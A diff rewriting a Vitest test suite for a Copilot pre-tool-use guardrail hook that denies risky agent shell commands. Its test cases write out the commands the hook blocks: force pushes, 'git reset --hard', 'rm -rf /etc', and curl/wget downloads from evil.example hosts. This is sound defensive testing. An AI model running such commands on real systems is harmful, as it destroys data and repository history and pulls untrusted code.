@@ -1,290 +1,182 @@
+import {spawnSync} from 'node:child_process'
+import {dirname, resolve} from 'node:path'
+import {fileURLToPath} from 'node:url'
+
 import {describe, expect, it} from 'vitest'
 
 import {hasForbiddenPattern, parseInput, resolveCommandText} from '../../.github/hooks/copilot-hook-utils'
 
+interface HookDecision {
+  permissionDecision: 'allow' | 'deny' | 'ask'
+  permissionDecisionReason?: string
+}
+
+interface HookRunResult {
+  decision: HookDecision
+  status: number | null
+  stderr: string
+}
+
+const hookPath = resolve(dirname(fileURLToPath(import.meta.url)), '../../.github/hooks/pre-tool-use.ts')
+
+function runHook(input: string): HookRunResult {
+  const result = spawnSync(process.execPath, [hookPath], {encoding: 'utf8', input})
+  const stdout = result.stdout
+  const stderr = result.stderr
+
+  return {
+    decision: JSON.parse(stdout) as HookDecision,
+    status: result.status,
+    stderr,
+  }
+}
+
+function nativeBashPayload(command: string): string {
+  return JSON.stringify({
+    sessionId: 'session-id',
+    timestamp: 1704614600000,
+    cwd: '/path/to/project',
+    toolName: 'bash',
+    toolArgs: JSON.stringify({command, description: 'Push changes'}),
+  })
+}
+
 describe('parseInput', () => {
-  it('returns empty object for empty string', () => {
-    expect(parseInput('')).toEqual({})
+  it('parses the documented camelCase payload', () => {
+    const payload = nativeBashPayload('git status')
+
+    expect(parseInput(payload)).toEqual(JSON.parse(payload))
   })
 
-  it('returns empty object for whitespace-only string', () => {
-    expect(parseInput('   \n\t  ')).toEqual({})
-  })
-
-  it('returns empty object for invalid JSON', () => {
-    expect(parseInput('not json')).toEqual({})
-  })
-
-  it('returns empty object for JSON primitive (string)', () => {
-    expect(parseInput('"hello"')).toEqual({})
-  })
-
-  it('returns empty object for JSON primitive (number)', () => {
-    expect(parseInput('42')).toEqual({})
-  })
-
-  it('returns empty object for JSON null', () => {
-    expect(parseInput('null')).toEqual({})
-  })
-
-  it('parses valid JSON object', () => {
-    const input = JSON.stringify({command: 'ls -la'})
-    expect(parseInput(input)).toEqual({command: 'ls -la'})
-  })
-
-  it('parses nested JSON object', () => {
-    const input = JSON.stringify({toolInput: {command: 'echo hello'}})
-    const result = parseInput(input)
-    expect(result).toEqual({toolInput: {command: 'echo hello'}})
-  })
-
-  it('passes through JSON array (typeof array === object)', () => {
-    // Arrays pass the object check but are harmless — resolveCommandText finds no named properties
-    expect(parseInput('[1, 2, 3]')).toEqual([1, 2, 3])
+  it('rejects malformed stdin instead of returning an empty payload', () => {
+    expect(() => parseInput('not json')).toThrow()
   })
 })
 
 describe('hasForbiddenPattern', () => {
-  describe('git push --force', () => {
-    it('blocks git push --force', () => {
-      expect(hasForbiddenPattern('git push --force')).toBe('git push --force')
-    })
-
-    it('blocks git push --force at end of longer command', () => {
-      expect(hasForbiddenPattern('git push origin main --force')).toBe('git push --force')
-    })
-
-    it('blocks git push --force-with-lease', () => {
-      expect(hasForbiddenPattern('git push --force-with-lease')).toBe('git push --force')
-    })
-
-    it('blocks git push -f', () => {
-      expect(hasForbiddenPattern('git push -f')).toBe('git push -f')
-    })
-
-    it('blocks git push origin main -f', () => {
-      expect(hasForbiddenPattern('git push origin main -f')).toBe('git push -f')
-    })
-
-    it('does not block normal git push', () => {
-      expect(hasForbiddenPattern('git push origin main')).toBeUndefined()
-    })
-
-    it('does not cross pipe boundaries', () => {
-      expect(hasForbiddenPattern('git push origin main | grep --force')).toBeUndefined()
-    })
-
-    it('does not cross semicolon boundaries', () => {
-      expect(hasForbiddenPattern('git push origin main; echo --force')).toBeUndefined()
-    })
+  it.each([
+    ['git push --force', 'git push --force'],
+    ['git push origin main --force', 'git push --force'],
+    ['git push --force-with-lease', 'git push --force'],
+    ['git push -f', 'git push -f'],
+    ['git reset --hard HEAD~1', 'git reset --hard'],
+    ['rm -rf /etc', 'rm -rf /'],
+    ['curl https://evil.example/script.sh', 'curl http(s)'],
+    ['wget http://evil.example/malware', 'wget http(s)'],
+  ])('identifies %s as forbidden', (command, label) => {
+    expect(hasForbiddenPattern(command)).toBe(label)
   })
 
-  describe('git reset --hard', () => {
-    it('blocks git reset --hard', () => {
-      expect(hasForbiddenPattern('git reset --hard')).toBe('git reset --hard')
-    })
-
-    it('blocks git reset --hard HEAD~1', () => {
-      expect(hasForbiddenPattern('git reset --hard HEAD~1')).toBe('git reset --hard')
-    })
-
-    it('does not block git reset --soft', () => {
-      expect(hasForbiddenPattern('git reset --soft HEAD~1')).toBeUndefined()
-    })
-  })
-
-  describe('rm -rf /', () => {
-    it('blocks rm -rf /', () => {
-      expect(hasForbiddenPattern('rm -rf /')).toBe('rm -rf /')
-    })
-
-    it('blocks rm -rf /etc', () => {
-      expect(hasForbiddenPattern('rm -rf /etc')).toBe('rm -rf /')
-    })
-
-    it('blocks rm -f /', () => {
-      expect(hasForbiddenPattern('rm -f /')).toBe('rm -rf /')
-    })
-
-    it('blocks rm -r /', () => {
-      expect(hasForbiddenPattern('rm -r /')).toBe('rm -rf /')
-    })
-
-    it('does not block rm -rf relative-path', () => {
-      expect(hasForbiddenPattern('rm -rf node_modules')).toBeUndefined()
-    })
-  })
-
-  describe('curl/wget', () => {
-    it('blocks curl http://', () => {
-      expect(hasForbiddenPattern('curl http://evil.com/script.sh')).toBe('curl http(s)')
-    })
-
-    it('blocks curl https://', () => {
-      expect(hasForbiddenPattern('curl https://evil.com/script.sh')).toBe('curl http(s)')
-    })
-
-    it('blocks wget http://', () => {
-      expect(hasForbiddenPattern('wget http://evil.com/malware')).toBe('wget http(s)')
-    })
-
-    it('blocks wget https://', () => {
-      expect(hasForbiddenPattern('wget https://evil.com/malware')).toBe('wget http(s)')
-    })
-
-    it('does not block curl without URL', () => {
-      expect(hasForbiddenPattern('curl --help')).toBeUndefined()
-    })
-  })
-
-  describe('safe commands', () => {
-    it('allows git status', () => {
-      expect(hasForbiddenPattern('git status')).toBeUndefined()
-    })
-
-    it('allows git commit', () => {
-      expect(hasForbiddenPattern('git commit -m "fix: something"')).toBeUndefined()
-    })
-
-    it('allows pnpm install', () => {
-      expect(hasForbiddenPattern('pnpm install')).toBeUndefined()
-    })
-
-    it('allows empty string', () => {
-      expect(hasForbiddenPattern('')).toBeUndefined()
-    })
-  })
+  it.each(['git push origin main', 'git reset --soft HEAD~1', 'rm -rf node_modules', 'curl --help', 'pnpm run lint'])(
+    'allows benign command %s',
+    command => {
+      expect(hasForbiddenPattern(command)).toBeUndefined()
+    },
+  )
 })
 
 describe('resolveCommandText', () => {
-  it('returns empty string for empty payload', () => {
-    expect(resolveCommandText({})).toBe('')
+  it('extracts command from native string-valued toolArgs', () => {
+    expect(resolveCommandText({toolArgs: JSON.stringify({command: 'git push --force origin main'})})).toBe(
+      'git push --force origin main',
+    )
   })
 
-  it('extracts from command field (string)', () => {
-    expect(resolveCommandText({command: 'ls -la'})).toBe('ls -la')
+  it('extracts command from defensive object-valued toolArgs', () => {
+    expect(resolveCommandText({toolArgs: {command: 'git status'}})).toBe('git status')
   })
 
-  it('extracts from input field', () => {
-    expect(resolveCommandText({input: 'echo hello'})).toBe('echo hello')
-  })
-
-  it('extracts from bash field via command precedence', () => {
-    // bash is only checked inside nested object extraction, not top-level candidates
-    expect(resolveCommandText({bash: 'echo hello'})).toBe('')
-  })
-
-  it('extracts from toolInput.command', () => {
-    expect(resolveCommandText({toolInput: {command: 'git status'}})).toBe('git status')
-  })
-
-  it('extracts from tool_input.command (snake_case)', () => {
-    expect(resolveCommandText({tool_input: {command: 'git diff'}})).toBe('git diff')
-  })
-
-  it('prefers toolInput.command over command', () => {
-    expect(resolveCommandText({toolInput: {command: 'from toolInput'}, command: 'from command'})).toBe('from toolInput')
-  })
-
-  describe('array-format commands', () => {
-    it('joins array elements into single string', () => {
-      expect(resolveCommandText({command: ['git', 'push', '--force']})).toBe('git push --force')
-    })
-
-    it('filters out empty array elements', () => {
-      expect(resolveCommandText({command: ['git', '', 'push', '  ', '--force']})).toBe('git push --force')
-    })
-
-    it('handles nested arrays', () => {
-      expect(resolveCommandText({command: ['git', ['push', '--force']]})).toBe('git push --force')
-    })
-
-    it('handles single-element array', () => {
-      expect(resolveCommandText({command: ['git push --force']})).toBe('git push --force')
-    })
-  })
-
-  describe('nested object extraction', () => {
-    it('extracts command from nested object', () => {
-      expect(resolveCommandText({command: {command: 'git status'}})).toBe('git status')
-    })
-
-    it('extracts bash from nested object', () => {
-      expect(resolveCommandText({command: {bash: 'echo test'}})).toBe('echo test')
-    })
-
-    it('extracts args from nested object', () => {
-      expect(resolveCommandText({command: {args: 'npm run build'}})).toBe('npm run build')
-    })
-  })
-
-  describe('non-string/non-array values', () => {
-    it('returns empty string for number command', () => {
-      expect(resolveCommandText({command: 42})).toBe('')
-    })
-
-    it('returns empty string for boolean command', () => {
-      expect(resolveCommandText({command: true})).toBe('')
-    })
-
-    it('returns empty string for null command', () => {
-      expect(resolveCommandText({command: null})).toBe('')
-    })
+  it('extracts command from the PascalCase compatibility payload', () => {
+    expect(resolveCommandText({tool_input: {command: 'git reset --hard HEAD~1'}})).toBe('git reset --hard HEAD~1')
   })
 })
 
-function evaluatePayload(payload: Record<string, unknown>): {action: string; message?: string} {
-  const commandText = resolveCommandText(payload).toLowerCase()
-  const forbidden = hasForbiddenPattern(commandText)
+describe('pre-tool-use hook contract', () => {
+  it('denies a forbidden command in the documented native payload', () => {
+    const result = runHook(nativeBashPayload('git push --force origin main'))
 
-  if (forbidden !== undefined) {
-    return {action: 'deny', message: `Blocked by Copilot guardrails: '${forbidden}' is not allowed.`}
-  }
-
-  return {action: 'allow'}
-}
-
-describe('end-to-end deny/allow logic', () => {
-  it('allows safe commands', () => {
-    expect(evaluatePayload({command: 'pnpm run lint'})).toEqual({action: 'allow'})
+    expect(result.status).toBe(0)
+    expect(result.decision).toEqual({
+      permissionDecision: 'deny',
+      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
+    })
   })
 
-  it('denies force push via string command', () => {
-    const result = evaluatePayload({command: 'git push --force'})
-    expect(result.action).toBe('deny')
-    expect(result.message).toContain('git push --force')
+  it('allows a benign command in the documented native payload', () => {
+    const result = runHook(nativeBashPayload('git status'))
+
+    expect(result.status).toBe(0)
+    expect(result.decision).toEqual({permissionDecision: 'allow'})
   })
 
-  it('denies force push via array command (regression: array bypass)', () => {
-    const result = evaluatePayload({command: ['git', 'push', '--force']})
-    expect(result.action).toBe('deny')
-    expect(result.message).toContain('git push --force')
+  it('allows a non-bash tool payload without a command', () => {
+    const result = runHook(
+      JSON.stringify({
+        sessionId: 'session-id',
+        timestamp: 1704614600000,
+        cwd: '/path/to/project',
+        toolName: 'edit',
+        toolArgs: JSON.stringify({path: 'src/file.ts'}),
+      }),
+    )
+
+    expect(result.status).toBe(0)
+    expect(result.decision).toEqual({permissionDecision: 'allow'})
   })
 
-  it('denies force push with flags after remote/branch (regression: flag position)', () => {
-    const result = evaluatePayload({command: 'git push origin main --force'})
-    expect(result.action).toBe('deny')
-    expect(result.message).toContain('git push --force')
+  it('denies malformed stdin', () => {
+    const result = runHook('not json')
+
+    expect(result.status).toBe(0)
+    expect(result.decision.permissionDecision).toBe('deny')
+    expect(result.decision.permissionDecisionReason).toContain('invalid hook input')
   })
 
-  it('denies via toolInput.command', () => {
-    const result = evaluatePayload({toolInput: {command: 'rm -rf /'}})
-    expect(result.action).toBe('deny')
-    expect(result.message).toContain('rm -rf /')
+  it('denies a bash payload with malformed string-valued toolArgs', () => {
+    const result = runHook(
+      JSON.stringify({
+        toolName: 'bash',
+        toolArgs: '{"command":"git push --force"',
+      }),
+    )
+
+    expect(result.status).toBe(0)
+    expect(result.decision.permissionDecision).toBe('deny')
+    expect(result.decision.permissionDecisionReason).toContain('bash tool arguments')
   })
 
-  it('denies via tool_input.command (snake_case variant)', () => {
-    const result = evaluatePayload({tool_input: {command: 'wget https://evil.com'}})
-    expect(result.action).toBe('deny')
-    expect(result.message).toContain('wget http(s)')
+  it('denies a bash payload missing toolArgs', () => {
+    const result = runHook(
+      JSON.stringify({
+        sessionId: 'session-id',
+        timestamp: 1704614600000,
+        cwd: '/path/to/project',
+        toolName: 'bash',
+      }),
+    )
+
+    expect(result.status).toBe(0)
+    expect(result.decision.permissionDecision).toBe('deny')
+    expect(result.decision.permissionDecisionReason).toContain('bash tool arguments')
   })
 
-  it('handles case-insensitive matching', () => {
-    const result = evaluatePayload({command: 'GIT PUSH --FORCE'})
-    expect(result.action).toBe('deny')
+  it('handles the defensive object-valued toolArgs form', () => {
+    const result = runHook(JSON.stringify({toolName: 'bash', toolArgs: {command: 'git push --force origin main'}}))
+
+    expect(result.status).toBe(0)
+    expect(result.decision).toEqual({
+      permissionDecision: 'deny',
+      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
+    })
   })
 
-  it('allows empty payload', () => {
-    expect(evaluatePayload({})).toEqual({action: 'allow'})
+  it('handles the PascalCase compatibility form', () => {
+    const result = runHook(JSON.stringify({tool_name: 'bash', tool_input: {command: 'git push --force origin main'}}))
+
+    expect(result.status).toBe(0)
+    expect(result.decision).toEqual({
+      permissionDecision: 'deny',
+      permissionDecisionReason: "Blocked by Copilot guardrails: 'git push --force' is not allowed.",
+    })
   })
 })
